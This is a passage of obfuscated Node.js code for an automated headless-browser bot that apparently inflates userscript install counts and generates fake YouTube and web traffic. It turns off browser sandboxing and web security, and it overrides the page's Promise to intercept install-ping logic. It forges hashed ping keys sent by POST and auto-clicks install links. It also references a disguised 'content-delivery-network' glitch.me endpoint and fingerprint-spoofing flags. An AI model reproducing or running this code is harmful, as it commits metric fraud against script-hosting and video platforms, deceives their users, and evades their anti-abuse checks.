+ -0x15c3 + 0x2502 | L >> 0x53b * -0x2 + 0x14 * -0x1f4 + -0x5e * -0x87 & -0x1 * 0x1457 + 0x162a * 0x1 + 0x194 * -0x1) << y[0x24ad + 0x1f1e + -0x43c8 & N++], P[N >> 0x71d + -0x16dc + 0x25 * 0x6d] |= (0x34c + 0xe08 + 0x86a * -0x2 | L >> -0x22fe + 0x284 + 0x2080 & 0x2440 + 0x1 * 0x24a6 + -0x48a7) << y[0x178f + 0x6d * 0x3d + -0x713 * 0x7 & N++], P[N >> -0xe6a + 0xf5c * -0x2 + 0x282 * 0x12] |= (0x260c * 0x1 + -0x1235 * -0x1 + -0x7 * 0x7f7 | 0x815 * 0x4 + 0x2684 + -0x4699 & L) << y[0x1378 + 0x5a1 + 0xa9 * -0x26 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x89e + -0x1 * -0x641 + -0xe9f ? (this['block'] = P[0x1577 + -0xaab * -0x1 + -0x335 * 0xa], this['start'] = N - (-0x1d1c + 0x2587 + -0x29 * 0x33), this['hash'](), this['hashed'] = -0x1c6 + -0xb76 + 0xd3d * 0x1) : this['start'] = N;
                }
                return this['bytes'] > -0x16dd10ddf + 0xd509c0c + -0x991 * -0x3f9bb2 && (this['hBytes'] += this['bytes'] / (0x10a8b858 + 0x31c * -0x68558b + 0x233c143dc) << 0xd * 0x253 + -0x21c9 + 0x1c9 * 0x2, this['bytes'] = this['bytes'] % (-0x1541e26c0 + -0x43837 * 0xa44 + -0x2 * -0x13fb79dae)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x8f5 + -0x1f * 0x56 + -0x2 * -0x9b0;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x3a + -0x4 * -0x4eb + 0x1362 * -0x1] = this['block'], J[K >> -0x21a * 0x1 + -0x6 * 0x208 + -0x16e * -0xa] |= x[0x12f8 + 0x168d * -0x1 + 0x398 & K], this['block'] = J[0x34f + -0xe3 * -0xe + 0xd3 * -0x13], K >= 0xb * 0xde + -0x1d51 * 0x1 + -0x1 * -0x13ff && (this['hashed'] || this['hash'](), J[-0x41a + 0x15b * -0x8 + 0xef2] = this['block'], J[-0x91d + -0x68 * -0x4f + 0x1 * -0x16eb] = J[0x78e * -0x1 + -0x254a + 0x2cd9] = J[-0xef * 0xf + 0x2314 + 0x1511 * -0x1] = J[-0x27 * 0x4 + 0x1cf * 0xb + -0x1346] = J[-0x15d + 0xbaa + -0xa49] = J[0x2622 + 0x5 * 0xcf + -0x2a28] = J[0x1b * 0xd5 + 0x1855 + -0x2ec6] = J[-0x1d31 + -0x6 * 0x2a1 + 0x2cfe] = J[-0xb5b + -0x270c + 0x326f] = J[-0x276 * 0x7 + 0x1617 + 0x6 * -0xce] = J[-0xa6a + 0x47d * -0x4 + 0x3 * 0x978] = J[-0x5ac + 0x1375 + -0xdbe] = J[0x74c + 0x158f + 0x1 * -0x1ccf] = J[-0x2b + -0xe26 + 0xe5e] = J[-0x4 * 0x27a + -0x2616 + 0x300c] = J[0x2330 + 0x1c81 + 0x3fa2 * -0x1] = -0x11 * 0xfc + 0x1 * -0x1f49 + 0x3005 * 0x1), J[0xbec * 0x2 + -0xc83 + -0xb47] = this['hBytes'] << -0xba6 + 0xe87 + 0x16f * -0x2 | this['bytes'] >>> 0x1 * -0x1242 + 0x2333 + -0x10d4, J[-0x613 * -0x5 + -0x21ca + 0x37a] = this['bytes'] << 0x16ab + -0x254 * 0x1 + -0x1454, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x93f * -0x4 + 0x13e0 + -0x1c66 * 0x2; J < 0x8 * -0x7f + -0x4 * 0x210 + 0xc88; ++J)
                K = Q[J - (-0x9f6 + -0x24d9 + -0x1 * -0x2ed2)] ^ Q[J - (0x1 * -0x9c2 + -0xea9 + 0x1873 * 0x1)] ^ Q[J - (-0x103f * 0x1 + -0x17e0 + 0x3a7 * 0xb)] ^ Q[J - (-0x65 * -0x38 + 0xc6 + -0x16ce)], Q[J] = K << -0x1c0 * 0x8 + 0x251 * 0x1 + 0xbb0 | K >>> 0x285 + 0x140c * -0x1 + 0x11a6;
              for (J = -0x1ab1 + 0x1 * 0x7df + 0xb * 0x1b6; J < 0x11eb + 0x43b + -0x1612; J += 0x24f3 + 0x57b + -0x2a69)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0x13a2 + -0x2 * 0xabd + -0x9f * -0x3 | L >>> 0x5 * 0x3af + 0x3 * -0xbfb + 0x1 * 0x11a1) + (M & N | ~M & O) + P + (-0x17af8270 + 0x2d8cf488 * -0x1 + 0x9fbef091) + Q[J] << 0x164f * 0x1 + 0x2e2 + -0x1931) << 0x1a56 * -0x1 + 0x7b * -0xc + -0x1 * -0x201f | P >>> 0x2c * 0xb1 + -0x516 + 0x869 * -0x3) + (L & (M = M << 0x551 * -0x4 + -0x79 * 0x1a + 0x21ac | M >>> -0x2cf * -0x4 + -0x7 * 0x3e4 + -0x2 * -0x801) | ~L & N) + O + (-0x5df847ce + 0xa67b295e * 0x1 + 0x11ff9809) + Q[J + (-0x1 * 0x11fc + 0x2282 + -0x1085 * 0x1)] << 0x1e4 * 0x6 + 0x4 * 0x5b7 + -0x2 * 0x111a) << -0x1e37 + -0x43b * -0x2 + -0x3 * -0x742 | O >>> 0x5c8 + 0x14b7 + -0x1a64) + (P & (L = L << 0x29 * -0x1f + 0x1e2f + 0xe * -0x1cb | L >>> -0xb * 0x259 + -0x11 * -0x94 + -0x1 * -0x1001) | ~P & M) + N + (-0x30e88c3e + -0x16ee53 * 0x250 + 0xc07225c7) + Q[J + (-0x47 * 0x1b + -0x1f5b + 0x136d * 0x2)] << -0x9d6 + 0x1ae7 * 0x1 + -0x1111) << -0x220a + 0x214e + 0xc1 | N >>> -0x11f7 + 0x13d9 * 0x1 + -0x1c7) + (O & (P = P << -0xbf3 + -0xb99 + 0x17aa | P >>> 0x13b9 + 0x34 * -0x1e + 0xd9f * -0x1) | ~O & L) + M + (-0xad3bc2c0 + 0x3e435fc3 + -0x4328f432 * -0x3) + Q[J + (-0x12b6 + 0x1 * -0x1bd4 + 0x2e8d)] << 0xf37 + -0xaca + -0x1 * 0x46d) << 0x1ce1 * 0x1 + 0x9b * 0x1f + -0x2fa1 | M >>> 0x267e + -0x2 * 0xb89 + -0xf51) + (N & (O = O << 0x5d1 * 0x4 + 0x2510 + -0x7 * 0x89a | O >>> 0x886 * -0x4 + 0x1 * -0x18bc + -0x3ad6 * -0x1) | ~N & P) + L + (0x405c578e + 0xb2e57a18 + 0x1 * -0x98bf580d) + Q[J + (-0xd04 + -0x2370 + 0x4 * 0xc1e)] << -0x16d9 * -0x1 + 0x15e9 + 0x151 * -0x22, N = N << -0x781 + -0x29f + -0x6 * -0x1b5 | N >>> -0x257 * -0x1 + -0x10eb * -0x1 + -0x1340;
              for (; J < -0x1 * -0x1dca + -0x21ed + 0x44b; J += 0xa37 + -0x21a2 + 0x3c * 0x64)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1aa1 + -0xcce + 0x5 * 0x7e4 | L >>> -0xb95 + 0x40e * 0x2 + 0x394) + (M ^ N ^ O) + P + (0x201f4e0 * 0x1a + 0x2662ad23 * -0x1 + -0x3084dd02 * -0x2) + Q[J] << 0xfcb + 0x1d91 + -0x2d5c) << -0x20c7 * 0x1 + 0x1398 + 0xd34 | P >>> -0xc72 + -0x2 * -0x34e + -0x9 * -0xa9) + (L ^ (M = M << -0x23ba + 0x187f + 0xb59 * 0x1 | M >>> 0x2146 * 0x1 + 0xd34 + -0x5cf * 0x8) ^ N) + O + (-0xd6a3f3f * -0x5 + -0x2226c9 * 0x61 + 0x38b7618f) + Q[J + (-0x10a9 + 0x15f9 + -0x54f)] << -0x1730 + -0x26b1 + -0xd9 * -0x49) << 0xe02 + 0x178c + 0x1 * -0x2589 | O >>> 0x241c + -0x3 * 0x335 + -0x1a62) + (P ^ (L = L << 0xa62 * 0x1 + 0x1e52 + 0x144b * -0x2 | L >>> 0x2cd + -0x2a1 * 0x1 + -0x2a) ^ M) + N + (-0x35 * -0x4185821 + -0x20b8838 * -0x51 + -0x10fd66cec) + Q[J + (-0xc * 0xa1 + -0x2 * 0x427 + 0xfdc)] << -0xfbf + -0xf52 * 0x1 + 0xf1 * 0x21) << -0xb * -0x2a4 + -0x1 * 0xc0b + 0x87e * -0x2 | N >>> 0x24eb + -0x4 * 0xda + -0x2168) + (O ^ (P = P << 0x44 + 0xa89 + -0x1 * 0xaaf | P >>> 0xd3 * -0x1 + -0xf46 + -0x1f * -0x85) ^ L) + M + (-0x1f * -0xe2271f + 0x721c5d7b + -0x1ea52e9b) + Q[J + (-0x1a66 + 0x9d * -0x1a + 0x2a5b)] << 0x1f1d * 0x1 + 0x168b + -0x35a8) << 0x35 * 0x47 + -0x1b * 0x29 + -0xa5b | M >>> -0x25ec + -0x8bd * 0x1 + -0xbb1 * -0x4) + (N ^ (O = O << 0x1 * 0x1663 + 0x5ae + -0x1bf3 | O >>> 0x10fb + 0x1ec1 + 0x17dd * -0x2) ^ P) + L + (0xdf82ed4 + -0x553351c0 + 0xb6150e8d * 0x1) + Q[J + (0x117b * -0x1 + -0x1e04 + 0x2f83)] << 0x1 * 0xf31 + 0xf * -0x6d + -0x8ce, N = N << 0xc * 0x263 + 0x19b4 + -0x363a | N >>> -0x1b6b * 0x1 + -0x2fd * 0x2 + 0x2167;
              for (; J < 0x20db + 0x70 * -0x39 + 0x119 * -0x7; J += 0x15c2 + -0x2 * -0x131f + 0x25 * -0x19f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1213 + -0x20d5 + 0xec7 | L >>> 0xd98 + 0x1 * 0x1dd7 + 0x4 * -0xad5) + (M & N | M & O | N & O) + P - (0x26b * -0x52bbf + 0x37ad73fa + 0x45b795ff) + Q[J] << -0xc0 + -0x2 * 0x97a + 0x184 * 0xd) << 0x1d8e + 0x848 + -0x25d1 | P >>> -0x1b * -0x8 + 0x4a7 + -0x1e * 0x2e) + (L & (M = M << 0x1066 + -0x174e + -0x1 * -0x706 | M >>> -0xa17 + -0x19e8 + 0xd * 0x2c5) | L & N | M & N) + O - (0x6fc9b681 + 0x27523 * -0x5252 + 0xcb6947d9) + Q[J + (0x22d0 + 0x7ac * 0x1 + -0x4b * 0x91)] << -0x409 + 0x12d9 + -0x30 * 0x4f) << 0x195c + -0xf43 + -0xa14 | O >>> 0x1b89 + 0x52 * -0x14 + 0x256 * -0x9) + (P & (L = L << -0xe * 0x1f0 + 0x8 * 0x59 + -0xc3b * -0x2 | L >>> -0x3ea + -0x183c + 0x6a * 0x44) | P & M | L & M) + N - (-0xa73f8d7e + -0x38267e81 + 0x1504a4f23) + Q[J + (0xa7b * -0x2 + -0xf6a + 0x2462 * 0x1)] << -0x2425 + -0x8ca + -0x2cef * -0x1) << 0x242 * -0x7 + -0x86 + 0x1059 | N >>> -0x166d * -0x1 + -0xedb * -0x1 + -0x252d) + (O & (P = P << 0x2207 * -0x1 + -0x499 * -0x1 + 0x1d8c | P >>> 0x155c * 0x1 + 0xd * -0x13a + 0x2b4 * -0x2) | O & L | P & L) + M - (0x2ab9 * -0x40f13 + 0xd22261e8 + 0x4c29e3f7) + Q[J + (-0x10e6 + -0x2474 * -0x1 + 0x138b * -0x1)] << -0x220 + 0x26ce + 0x1e * -0x139) << -0x2483 + -0x1a5c + -0x8fc * -0x7 | M >>> 0xd3a * -0x1 + 0xb21 + 0x234) + (N & (O = O << -0x1 * -0x193b + -0x266d + -0xd50 * -0x1 | O >>> -0x189e + -0x136d + 0x2c0d) | N & P | O & P) + L - (0xbe522f7f + 0x592c9052 + -0x1 * 0xa69a7cad) + Q[J + (0x6 * -0x9 + -0x12 + 0x26 * 0x2)] << -0x4d * -0x53 + 0x8c9 * -0x3 + 0x164, N = N << -0x2a7 + -0x2 * 0x1191 + 0x25e7 | N >>> -0x125 * 0xa + 0x17e * -0x3 + 0x2 * 0x7f7;
              for (; J < 0x47 * 0xa + -0x11c + -0x15a; J += -0x2574 + -0x13f9 * 0x1 + 0x1 * 0x3972)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x17f0 + 0x1 * 0x14b + 0x16aa | L >>> 0x3 * -0x47f + 0x4 * -0x85 + 0x76 * 0x22) + (M ^ N ^ O) + P - (0x1b56778f + 0x4cbe005c + -0x327739c1 * 0x1) + Q[J] << 0x2686 + -0x26dc + 0x56 * 0x1) << -0x226d + 0x1 * -0x421 + -0x7b7 * -0x5 | P >>> -0xaad * 0x1 + 0x1d1 * 0x2 + 0x726) + (L ^ (M = M << -0x20b4 + 0x2 * -0x5fb + 0x2cc8 | M >>> 0x1021 + 0x2cd * 0x9 + 0x844 * -0x5) ^ N) + O - (0x256fbbd5 * -0x1 + -0x5c454872 + 0x1b * 0x6ca2863) + Q[J + (-0x1 * -0x12c2 + 0x26 * -0xbd + 0x94d)] << 0x1 * -0x1a77 + -0x1 * 0x1ddb + -0x36 * -0x10b) << -0x5f * -0x1e + 0x5 * 0x7c0 + -0xb9 * 0x45 | O >>> -0xcb9 * -0x3 + -0x75 * -0x13 + -0xf95 * 0x3) + (P ^ (L = L << 0xdf7 * 0x2 + 0x1 * 0x773 + -0x2343 | L >>> 0x37f + 0xb08 * 0x2 + 0xd3 * -0x1f) ^ M) + N - (0x6 * 0xb6ba35c + 0x3459deba + -0x434274b8) + Q[J + (0x107a + -0x25de + -0x722 * -0x3)] << 0x4 * 0x587 + 0x1f05 + -0x3521) << -0x2049 + -0x1e0d + 0x3 * 0x14c9 | N >>> 0x1 * -0x1fcc + -0x43 * 0x47 + -0x86a * -0x6) + (O ^ (P = P << -0x1a8f + 0x3 * -0x66e + 0x2df7 | P >>> 0x49 * -0x7b + -0x1 * -0x2279 + 0x9c) ^ L) + M - (0x5f7c5944 + -0x2ed * -0xbe075 + -0x4c9ed16b) + Q[J + (0xf5 * -0x25 + -0x13c9 + 0x7 * 0x7e3)] << 0x1109 + 0x1 * 0x137 + 0x920 * -0x2) << 0x1d7d * 0x1 + 0x387 + -0x20ff | M >>> -0x1 * -0x802 + -0x1895 + 0x10ae) + (N ^ (O = O << 0x1 * 0x622 + 0x269 * 0x10 + 0x4 * -0xb25 | O >>> 0xf46 * 0x1 + -0x1a77 + 0xb33 * 0x1) ^ P) + L - (-0x2af927b * -0x5 + 0xac36ce * 0x67 + -0x179 * 0x13c357) + Q[J + (0x150d + 0x8a8 + -0x1db1)] << 0x2239 + 0x1 * -0xfee + -0x1 * 0x124b, N = N << -0xea0 + 0x1dc5 * -0x1 + 0x2c83 | N >>> 0x4f * -0x49 + 0x214f + -0xac6;
              this['h0'] = this['h0'] + L << 0x1e4e + -0x27e * 0x7 + -0xcdc, this['h1'] = this['h1'] + M << -0xcdd + 0xad * -0x7 + 0x1198, this['h2'] = this['h2'] + N << 0xa63 + -0xfe9 * 0x2 + -0xb1 * -0x1f, this['h3'] = this['h3'] + O << -0x1ed7 + -0x38 * -0x79 + 0x45f, this['h4'] = this['h4'] + P << -0x19c8 + 0x5c6 * 0x2 + -0x1 * -0xe3c;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0xb7 * 0x9 + -0x98 * -0x1c + 0x497 * -0x5 & -0x1b44 + 0x1 * -0x19eb + -0x1d * -0x1d6] + w[J >> -0x4 * 0xc5 + -0x175 * -0xb + 0xcdb * -0x1 & 0x1680 + -0x2 * 0xcb3 + 0x2f5] + w[J >> 0x5 * -0x245 + -0xb47 * 0x1 + -0x5ad * -0x4 & 0x264c + 0xd1f * 0x1 + -0x335c] + w[J >> 0x5 * -0x1a6 + -0x1406 + 0x1c54 & -0x17b6 + -0x12be * 0x2 + -0x3d41 * -0x1] + w[J >> -0x20f3 + 0x31 * -0x20 + -0x271f * -0x1 & 0x1a * 0x11b + 0xeb7 * 0x1 + 0x6e * -0x65] + w[J >> 0x6 * -0x1f4 + 0x1 * 0x47f + -0x1 * -0x741 & -0xcf2 * 0x1 + -0x24f4 + 0x31f5] + w[J >> 0x17 * 0xb + 0x1f * 0x4f + -0xa8a & 0x1 * -0x217a + -0x2f * 0x95 + -0x1b1 * -0x24] + w[-0x1f89 + -0x1 * 0xe33 + 0x1 * 0x2dcb & J] + w[K >> 0x143b + -0x1f51 + -0x2 * -0x599 & -0x2677 + 0x8 * 0x4bd + -0x1 * -0x9e] + w[K >> 0x21f7 + 0x13ac + -0x358b & -0x2468 + 0x1eea + -0x58d * -0x1] + w[K >> 0x637 * 0x5 + 0x382 + -0x2281 & 0x2546 + -0x2 * 0x1034 + -0x4cf * 0x1] + w[K >> -0x4fb * 0x2 + -0x26d2 * -0x1 + -0x1ccc * 0x1 & 0x1 * 0x16e9 + 0x7 * 0x25 + -0x17dd * 0x1] + w[K >> -0xf78 + 0x14e0 + -0x55c & -0x1 * -0x2473 + -0x17c3 * -0x1 + -0x3c27] + w[K >> -0x3c1 * 0x3 + -0x22a9 + -0x22 * -0x15a & -0x2 * -0x9a + -0x5a * -0x6d + -0x2777] + w[K >> -0x1 * 0x6c4 + 0xd31 + -0x1 * 0x669 & 0x3c0 + -0x7 * -0x11 + 0xe * -0x4c] + w[0x129b * -0x1 + 0xe5 * 0x17 + -0x1e9 & K] + w[L >> -0xda2 + 0x17cc + -0x1 * 0xa0e & -0xef9 + 0x9ca + 0x53e] + w[L >> -0x191d * 0x1 + -0xdcd * 0x1 + -0x1381 * -0x2 & 0x2 * -0x5a4 + -0x111 * -0xb + -0x64] + w[L >> -0xaef + -0xbf * -0xd + 0x8 * 0x2a & -0x240f + -0x5d * 0x8 + 0x9 * 0x456] + w[L >> 0x18ea + -0x49 * 0x1 + -0x14b * 0x13 & 0x31 * 0x35 + -0x2123 + -0x7af * -0x3] + w[L >> -0x1 * 0x1d04 + -0x1d93 + -0x1 * -0x3aa3 & -0x12e9 + -0x186c + 0x2 * 0x15b2] + w[L >> 0x233e + 0x445 + -0x277b & -0x1a76 + -0xf9f + -0x6 * -0x706] + w[L >> -0xed * -0x2 + -0x2 * 0xc39 + 0x169c * 0x1 & 0xc17 + 0x2014 + -0xc * 0x3ad] + w[0xd * 0x47 + -0x6a4 * 0x5 + -0x49 * -0x68 & L] + w[M >> -0x49 * 0x2b + 0x1650 + -0x9f1 * 0x1 & 0x270c + 0xd * -0x266 + -0x7cf] + w[M >> 0x119b + -0x1 * 0x101c + -0x167 & -0x196b + 0xc6a + -0x1 * -0xd10] + w[M >> 0x20fb + -0x44e + -0x1c99 * 0x1 & 0x39 * 0x87 + -0xda5 + -0x4f * 0x35] + w[M >> 0x563 * 0x1 + 0x1c64 + -0x21b7 & -0xebb * -0x1 + 0x17a + -0x1026] + w[M >> 0x3e6 + 0xa6d + 0x55 * -0x2b & -0x1c01 * 0x1 + 0x12a4 * 0x2 + 0xec * -0xa] + w[M >> 0x1e64 + 0x14c5 * -0x1 + -0x997 & 0xb * 0x2ef + 0xb10 + -0x15a3 * 0x2] + w[M >> 0xa + -0x2422 + 0x241c & -0x26b2 + -0x4 * -0x62e + -0xe09 * -0x1] + w[-0x504 + -0x22bd + 0x2 * 0x13e8 & M] + w[N >> 0xd8f + -0xb6 * -0x2 + 0x8d * -0x1b & 0x170e + 0x3 * 0x8b + -0x18a0] + w[N >> 0x759 + 0x1d6 * -0x11 + 0x17f5 & -0x19c8 + 0x1852 + 0x185] + w[N >> -0x53 * 0x35 + -0x248c + -0x1db * -0x1d & -0x1 * 0x1e17 + -0x1 * -0x85f + 0x15c7] + w[N >> 0x12d5 + -0x1327 + 0x62 & 0x3 * -0x967 + -0x9cc + 0x2610] + w[N >> -0x23e0 + 0x3a4 + 0x2048 & 0x11e2 + 0x127c + -0xa9 * 0x37] + w[N >> 0x2f9 + -0x227 * 0x4 + 0x5ab & 0x681 + 0x1782 + -0x9fc * 0x3] + w[N >> -0x25e9 + -0x6b9 * 0x2 + 0x335f * 0x1 & 0x15b1 + -0xa * 0x3c5 + -0x808 * -0x2] + w[0x9fb + 0x2623 + -0x300f & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xd90 + -0x12ea + 0x2092 & -0x3 * -0x41b + 0x1 * 0x1443 + -0x1f95,
                J >> 0x1af9 * -0x1 + 0x21d7 * 0x1 + -0x6ce & 0x615 * 0x6 + -0x1 * 0x1c03 + 0x2 * -0x3be,
                J >> 0xfb * -0xb + -0x3c3 + 0xe94 & -0xb * 0x160 + 0xe4 + -0x22d * -0x7,
                -0x7ba + -0x3 * 0x120 + -0xc19 * -0x1 & J,
                K >> 0x80d + -0x28f * -0x2 + 0x1 * -0xd13 & -0xc3d + -0x1 * -0x15b5 + 0x879 * -0x1,
                K >> -0x1 * -0x1a93 + -0x6e * -0x26 + 0x2ad7 * -0x1 & -0x1cbc + -0x683 + -0x121f * -0x2,
                K >> -0x1984 + 0x1ad2 + -0x146 & -0x1c8b + -0x1650 + 0x33da,
                0x20cf + -0x192e + -0x6a2 & K,
                L >> 0xec + -0xe * 0x39 + 0x24a & 0x135c + -0x8 * 0xfa + -0xa8d,
                L >> 0xb * -0x12b + -0x2681 + 0x336a & 0xcdd + -0x113f + 0x561,
                L >> 0x5 * -0x191 + -0x5 * -0x551 + -0x12b8 & -0x1 * -0x2659 + 0x1f63 * 0x1 + -0x44bd,
                -0xd64 + 0x4ab + 0x9b8 & L,
                M >> -0x26ef + -0x1f7 * 0x13 + 0x4c5c & 0x1d96 + 0xd * -0x20 + 0xb1 * -0x27,
                M >> 0x3 * 0xa82 + 0x6ff + 0x1 * -0x2675 & -0x2f * 0x61 + -0x312 * -0xa + -0x2 * 0x5f3,
                M >> -0x4a9 + -0x2035 + -0x2 * -0x1273 & -0x21cc + -0x2 * 0xbca + -0x1 * -0x3a5f,
                0xb49 + 0x3e * -0x19 + -0x43c & M,
                N >> 0xf6c + 0xaf1 * 0x3 + -0x3027 & 0x178d + 0x1 * 0x14fe + -0x2 * 0x15c6,
                N >> 0x97e + -0x787 + -0x1e7 * 0x1 & -0xd4a + 0x3 * 0xb52 + -0x13ad,
                N >> -0x32b * -0x9 + 0x1840 + -0x1 * 0x34bb & 0xb79 + -0x3 * -0x677 + 0x1 * -0x1ddf,
                0x12ff + 0x252b + -0x1d * 0x1e7 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1eca * 0x1 + -0x8f7 + 0x27d5), (K = new DataView(J))['setUint32'](-0x18f9 * 0x1 + 0x1353 + -0x1e2 * -0x3, this['h0']), K['setUint32'](-0x2 * -0xc92 + 0xb * 0x1d1 + -0xf09 * 0x3, this['h1']), K['setUint32'](0x1d98 + -0x2 * 0x12a8 + 0xf8 * 0x8, this['h2']), K['setUint32'](-0x10ef + -0x170f * -0x1 + -0x614, this['h3']), K['setUint32'](-0x17 * -0x167 + -0x301 + -0x1d30, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0xb3b + -0x6a2 + -0x499];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1c76 + -0x3 * -0x260 + 0x1556;
            J[0x2 * 0xf28 + 0xc25 * 0x2 + -0x1d * 0x1e2]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xdf * 0x25 + 0x5 * 0x4e8 + 0x38c3 * -0x1] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x411 * 0x1 + 0x3ca * 0x7 + -0x1e96), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x887 * -0x1 + 0x2122 * 0x1 + -0x189a;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x2e * 0x8 + -0x1820 + 0x1c8c * 0x1), Promise['resolve'](-0x1d19 + -0x4 * 0x1ff + 0x2516);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1301 + 0x1d * -0x123 + 0xcfe * 0x4; j < 0x20ea + 0x19 * 0x109 + -0x3aca; j++)
    i();
}
const NETWORK_PATIENCE = 0x1 * -0x189 + -0x1172 + 0x323b + (-0x2523 + 0x1 * 0xd6c + 0x2f * 0xc1) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1 * -0x111e + -0x1f17 + 0x37f * 0x4) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    W(0x3) + 'w.youtube.' + 'com/@MrBea' + 'st',
    X(0xe, 'WeRf') + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x3fe + -0x2 * -0xf73 + -0x22e4; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + Y(0x14) + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 